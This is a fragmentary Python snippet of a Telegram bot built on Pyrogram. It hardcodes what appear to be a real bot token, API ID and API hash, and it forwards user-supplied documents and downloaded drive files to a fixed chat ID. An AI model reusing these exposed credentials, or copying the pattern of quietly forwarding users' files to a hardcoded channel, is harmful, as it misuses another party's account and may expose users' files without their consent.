...
bot = Client("bot",
             bot_token= "7350135417:AAEjnqZhUX-IeARKYIz9NF9CK_DkMTJkv0c",
             api_id= 27355149,
             api_hash= "68bcb1ab22bd80bbae9d66ccddf540c2")
...
async def account_login(bot: Client, m: Message):
    ...
    if input.document:
        ...
        await bot.send_document(-1002206887940, x)
            ...
            try:                               
                ...
                if "drive" in url:
                    try:
                        ...
                        await copy.copy(chat_id = -1002206887940)
                        count+=1
                        os.remove(ka)
                        time.sleep(1)
